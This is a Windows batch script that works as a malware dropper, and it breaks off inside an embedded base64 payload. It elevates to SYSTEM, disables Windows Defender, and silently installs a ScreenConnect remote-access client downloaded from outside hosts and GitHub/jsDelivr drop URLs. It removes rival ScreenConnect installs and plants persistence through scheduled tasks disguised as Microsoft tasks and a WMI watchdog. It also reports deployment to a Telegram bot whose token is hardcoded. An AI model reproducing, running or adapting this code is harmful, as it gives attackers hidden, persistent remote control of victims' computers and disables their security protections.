@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O19 - self-contained embed + identity + mutual watchdog + pkg.msi fallback
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O19 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  copy /y "%~f0" "%BOOT%\own_run.cmd" >nul 2>&1
  if not exist "%BOOT%\own_run.cmd" (
    echo ERROR: cannot write %BOOT%\own_run.cmd
    exit /b 6
  )
  mkdir "%WD%" >nul 2>&1
  copy /y "%BOOT%\own_run.cmd" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>"%LOG%" 2>nul
  if not exist "%LOG%" (
    set "LOG=%BOOT%\boot.err"
    echo go_start %DATE% %TIME%>"%LOG%"
  )
  echo order=msi_then_primary_then_nuke_foreign>>"%LOG%"
  echo engine=cmd_detached_o18>>"%LOG%"
  echo whoami_launcher=>>"%LOG%"
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%"
  set "DETACH_OK=0"
  set "RUNNER=%BOOT%\own_run.cmd"
  if exist "%SELF%" set "RUNNER=%SELF%"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      set "PROOF=0"
      for /l %%N in (1,1,6) do (
        if exist "%BOOT%\wproof" set "PROOF=1"
        if not exist "%BOOT%\wproof" timeout /t 2 /nobreak >nul 2>&1
      )
      if "!PROOF!"=="1" (
        set "DETACH_OK=1"
        echo detach_via=schtasks_root>>"%LOG%"
      ) else (
        echo detach_a_noproof>>"%LOG%"
        type "%BOOT%\detach.task" >>"%LOG%" 2>&1
        type "%BOOT%\detach.run" >>"%LOG%" 2>&1
      )
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)
    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O19 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
echo embed_extract_done>>"%LOG%"

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%~dp0own_secure.cmd" copy /y "%~dp0own_secure.cmd" "%WD%\own_secure.cmd" >nul
if not exist "%WD%\own_secure.cmd" if exist "%BOOT%\own_secure.cmd" copy /y "%BOOT%\own_secure.cmd" "%WD%\own_secure.cmd" >nul
if not exist "%WD%\own_secure.cmd" if exist "%SystemRoot%\Temp\own_secure.cmd" copy /y "%SystemRoot%\Temp\own_secure.cmd" "%WD%\own_secure.cmd" >nul
if not exist "%WD%\own_secure.cmd" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
if not exist "%WD%\own_secure.cmd" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Ensure PRIMARY...
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

echo primary missing/stopped - MSI install...
echo primary_install_begin>>"%LOG%"
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
sc stop "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
echo msi_exit_%ERRORLEVEL%>>"%LOG%"
timeout /t 15 /nobreak >nul
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=vomus REBOOT=ReallySuppress /L*v "%WD%\msi_reinstall.log"
echo msi_reinstall_%ERRORLEVEL%>>"%LOG%"
timeout /t 10 /nobreak >nul

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

REM Always nuke foreign - KEEP1/KEEP2 stay (not gated on primary)
echo [4] Nuke foreign ScreenConnect (keep allowlist only)...
call :NukeForeign

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0own_mon.cmd" (
  copy /y "%~dp0own_mon.cmd" "%WD%\own_mon.cmd" >nul
) else (
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
if exist "%~dp0own_lib.ps1" copy /y "%~dp0own_lib.ps1" "%WD%\own_lib.ps1" >nul
if not exist "%WD%\own_lib.ps1" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
if not exist "%WD%\own_lib.ps1" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
if exist "%~dp0notify.cfg" copy /y "%~dp0notify.cfg" "%WD%\notify.cfg" >nul
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  copy /y "%MSI%" "%MSICACHE%" >nul
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,2 delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%V"
if not defined TASK_A set "TASK_A=\Microsoft\Windows\Diagnosis\Scheduled"
if not defined TASK_B set "TASK_B=\Microsoft\Windows\PLA\Server"
if not defined TASK_C set "TASK_C=\Microsoft\Windows\WDI\ResolutionHost"
if not defined TASK_D set "TASK_D=\Microsoft\Windows\Tcpip\IpAddressConflict1"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
echo identity_A=%TASK_A%>>"%LOG%"
echo identity_B=%TASK_B%>>"%LOG%"
echo identity_C=%TASK_C%>>"%LOG%"
echo identity_D=%TASK_D% mo=%MO_A%/%MO_B%>>"%LOG%"

REM schtasks /TR: single-level quotes only; paths never contain spaces
schtasks /Delete /TN "%TASK_A%" /F >nul 2>&1
schtasks /Create /TN "%TASK_A%" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO %MO_A% /F /TR "cmd.exe /c %WD%\own_mon.cmd" >nul 2>&1
schtasks /Delete /TN "%TASK_B%" /F >nul 2>&1
schtasks /Create /TN "%TASK_B%" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO %MO_B% /F /TR "cmd.exe /c %ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1
schtasks /Delete /TN "%TASK_C%" /F >nul 2>&1
schtasks /Create /TN "%TASK_C%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %WD%\own_mon.cmd" >nul 2>&1
schtasks /Delete /TN "%TASK_D%" /F >nul 2>&1
schtasks /Create /TN "%TASK_D%" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %WD%\own_mon.cmd" >nul 2>&1
echo persist_armed_identity>>"%LOG%"
REM verify tasks really registered
schtasks /Query /TN "%TASK_A%" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_B%" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_C%" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_D%" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O19 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%~dp0own_secure.cmd" copy /y "%~dp0own_secure.cmd" "%WD%\own_secure.cmd" >nul
if not exist "%WD%\own_secure.cmd" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  >"%WD%\notify.cfg" echo BOT_TOKEN=8619715754:AAFMk2NjND-hQk2xPFYjicHfB5MyKtcXCqg
  >>"%WD%\notify.cfg" echo CHAT_ID=7547462070
)
if exist "%~dp0tg_report.ps1" (
  copy /y "%~dp0tg_report.ps1" "%WD%\tg_report.ps1" >nul
) else (
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
if not exist "%WD%\tg_report.ps1" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%DROP%/tg_report.ps1' -OutFile '%WD%\tg_report.ps1' -UseBasicParsing" >nul 2>&1
)
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O19 >>"%LOG%" 2>&1
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo nuke_begin>>"%LOG%"
for /f "tokens=2 delims=:" %%A in ('sc query state= all ^| findstr /C:"SERVICE_NAME:"') do (
  set "SN=%%A"
  if defined SN (
    set "SN=!SN:~1!"
    echo !SN! | findstr /I "ScreenConnect" >nul
    if not errorlevel 1 (
      set "KEEP=0"
      echo !SN! | findstr /I "%KEEP1%" >nul && set "KEEP=1"
      echo !SN! | findstr /I "%KEEP2%" >nul && set "KEEP=1"
      if "!KEEP!"=="1" (
        echo keep_svc=!SN!>>"%LOG%"
      ) else (
        echo nuke_svc=!SN!>>"%LOG%"
        sc stop "!SN!" >nul 2>&1
        timeout /t 1 /nobreak >nul
        sc delete "!SN!" >nul 2>&1
      )
    )
  )
)

wmic process where "name='ScreenConnect.ClientService.exe' and not ExecutablePath like '%%!KEEP1!%%' and not ExecutablePath like '%%!KEEP2!%%'" call terminate >nul 2>&1
wmic process where "name='ScreenConnect.WindowsClient.exe' and not ExecutablePath like '%%!KEEP1!%%' and not ExecutablePath like '%%!KEEP2!%%'" call terminate >nul 2>&1

for %%R in ("%ProgramFiles%" "%PF86%") do (
  if exist "%%~R" for /d %%D in ("%%~R\ScreenConnect*") do (
    set "KEEP=0"
    echo %%~nxD | findstr /I "%KEEP1%" >nul && set "KEEP=1"
    echo %%~nxD | findstr /I "%KEEP2%" >nul && set "KEEP=1"
    if "!KEEP!"=="1" (
      echo keep_dir=%%~D>>"%LOG%"
    ) else (
      echo nuke_dir=%%~D>>"%LOG%"
      takeown /F "%%~D" /R /D Y >nul 2>&1
      icacls "%%~D" /grant Administrators:F /T /C >nul 2>&1
      rd /s /q "%%~D" >nul 2>&1
      if exist "%%~D" (
        echo nuke_dir_FAIL=%%~D>>"%LOG%"
      ) else (
        echo nuke_dir_ok=%%~D>>"%LOG%"
      )
    )
  )
)
echo nuke_done>>"%LOG%"
exit /b 0

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
::QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pW
::Q4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4p
::WQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4
::pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxE
::IDIwMjYwODAyTTEwDQpyZW0gIFBlcnNpc3RlbnQgd2F0Y2hkb2cgLSBpZGVudGl0eS1hd2FyZSA
::oYW50aS1zaWduYXR1cmUpLCBtdXR1YWwNCnJlbSAgV01JK3NjaHRhc2tzIGNoYWlucywgTVNJIG
::ZhbGxiYWNrIGNoYWluLCBzdGF0ZS5qc29uLCBkaWdlc3QgSEIuDQpyZW0gIEF1dGhvcml6ZWQga
::W50ZXJuYWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRpdGlvbiBzY29wZSBvbmx5Lg0KcmVtIOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOK
::VkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkO
::KVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVk
::OKVkOKVkOKVkOKVkOKVkOKVkA0Kc2V0bG9jYWwgRW5hYmxlRGVsYXllZEV4cGFuc2lvbg0KDQpz
::ZXQgIktFRVBfRlA9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiQUxUX0ZQPWY4NjFjODE0MGQ0NTM
::0MjciDQpzZXQgIldEPUM6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dzXFdFUlxUZW1wXC
::53dWNhY2hlIg0Kc2V0ICJFVEw9QzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSX
::FRlbXBcLmV0bGNhY2hlIg0Kc2V0ICJMT0c9JVdEJVxvd25fbW9uLmxvZyINCnNldCAiU1RBVEU9
::JVdEJVxvd25fbW9uLnN0YXRlIg0Kc2V0ICJIQkZMQUc9JVdEJVxoYi5mbGFnIg0Kc2V0ICJDVVJ
::MPSVTeXN0ZW1Sb290JVxTeXN0ZW0zMlxjdXJsLmV4ZSINCnNldCAiVEc9aHR0cHM6Ly9yYXcuZ2
::l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vdGdfcmVwb3J0L
::nBzMSINCnNldCAiVEcyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRo
::dWItZHJvcEBtYWluL3RnX3JlcG9ydC5wczEiDQpzZXQgIk9XTlNFQz1odHRwczovL3Jhdy5naXR
::odWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9vd25fc2VjdXJlLm
::NtZCINCnNldCAiT1dOU0VDMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ
::2l0aHViLWRyb3BAbWFpbi9vd25fc2VjdXJlLmNtZCINCnNldCAiT1dOTU9OPWh0dHBzOi8vcmF3
::LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9tb24
::uY21kIg0Kc2V0ICJPV05NT04yPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS
::9naXRodWItZHJvcEBtYWluL293bl9tb24uY21kIg0Kc2V0ICJPV05MSUI9aHR0cHM6Ly9yYXcuZ
::2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vb3duX2xpYi5w
::czEiDQpzZXQgIk9XTkxJQjI9aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2d
::pdGh1Yi1kcm9wQG1haW4vb3duX2xpYi5wczEiDQpzZXQgIk1TSV9VUkw9aHR0cHM6Ly9zZXZyei
::5jb20vU2NyZWVuQ29ubmVjdC5DbGllbnRTZXR1cC5tc2kiDQpzZXQgIk1TSV9QS0cxPWh0dHBzO
::i8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL3Br
::Zy5tc2kiDQpzZXQgIk1TSV9QS0cyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWR
::keS9naXRodWItZHJvcEBtYWluL3BrZy5tc2kiDQpzZXQgIk1TST0lUHJvZ3JhbURhdGElXFNjcm
::VlbkNvbm5lY3QuQ2xpZW50U2V0dXAubXNpIg0KDQppZiBub3QgZXhpc3QgIiVXRCUiIG1kICIlV
::0QlIiAyPm51bA0KaWYgbm90IGV4aXN0ICIlTE9HJSIgdHlwZSBudWw+IiVMT0clIiAyPm51bA0K
::DQpzZXQgIk1PTlZFUj1NMTAiDQpzZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCmZvciA
::vZiAidG9rZW5zPTEtMyBkZWxpbXM9LyAiICUlYSBpbiAoIiVkYXRlJSIpIGRvIHNldCAiRFQ9JW
::RhdGUlICV0aW1lJSINCmVjaG8uPj4iJUxPRyUiDQplY2hvIOKUgOKUgCB0aWNrICFEVCEgW3Zlc
::iAlTU9OVkVSJV0g4pSA4pSAPj4iJUxPRyUiDQpzZXQgIkNPVU5UPTAiDQpzZXQgIklOU1RBTExF
::RD0wIg0Kc2V0ICJQUklNX09LPTAiDQpzZXQgIkFMVF9PSz0wIg0Kc2V0ICJGT1JFSUdOX0xFRlQ
::9MCINCnNldCAiRk9SRUlHTl9MSVNUPSINCg0KcmVtIOKUgOKUgCBwZXItaG9zdCBpZGVudGl0eS
::AoYW50aS1zaWduYXR1cmUpIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUg
::OKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgbm90IGV4aXN0ICIlV0QlXGlk
::ZW50aXR5LmNmZyIgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJ
::vZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRC
::Vcb3duX2xpYi5wczEiIC1BY3Rpb24gaW5pdCAtV29ya0RpciAiJVdEJSIgPm51bCAyPiYxDQppZ
::iBleGlzdCAiJVdEJVxpZGVudGl0eS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsMiBk
::ZWxpbXM9PSIgJSVLIGluICgiJVdEJVxpZGVudGl0eS5jZmciKSBkbyBzZXQgIiUlSz0lJVYiDQp
::pZiBub3QgZGVmaW5lZCBUQVNLX0Egc2V0ICJUQVNLX0E9XE1pY3Jvc29mdFxXaW5kb3dzXERpYW
::dub3Npc1xTY2hlZHVsZWQiDQppZiBub3QgZGVmaW5lZCBUQVNLX0Igc2V0ICJUQVNLX0I9XE1pY
::3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXIiDQppZiBub3QgZGVmaW5lZCBUQVNLX0Mgc2V0ICJU
::QVNLX0M9XE1pY3Jvc29mdFxXaW5kb3dzXFdESVxSZXNvbHV0aW9uSG9zdCINCmlmIG5vdCBkZWZ
::pbmVkIFRBU0tfRCBzZXQgIlRBU0tfRD1cTWljcm9zb2Z0XFdpbmRvd3NcVGNwaXBcSXBBZGRyZX
::NzQ29uZmxpY3QxIg0KaWYgbm90IGRlZmluZWQgTU9fQSBzZXQgIk1PX0E9MiINCmlmIG5vdCBkZ
